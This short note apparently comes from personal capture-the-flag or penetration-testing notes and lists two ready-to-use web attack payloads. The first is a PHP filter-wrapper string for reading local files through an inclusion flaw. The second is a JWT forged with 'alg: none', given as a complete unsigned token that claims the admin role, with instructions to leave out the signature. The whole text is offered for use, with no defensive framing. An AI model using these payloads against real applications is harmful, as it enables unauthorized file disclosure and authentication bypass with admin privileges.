space php use in filter
```php
php://filter/convert.iconv.utf-8.utf-16le/resource=file://
```
---

in JWT 
```JSON 
{
  "typ": "JWT",
  "alg": "none"
}
```
Don't send the SIGNATURE send like this :

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
and don't forget dot `.` 

---
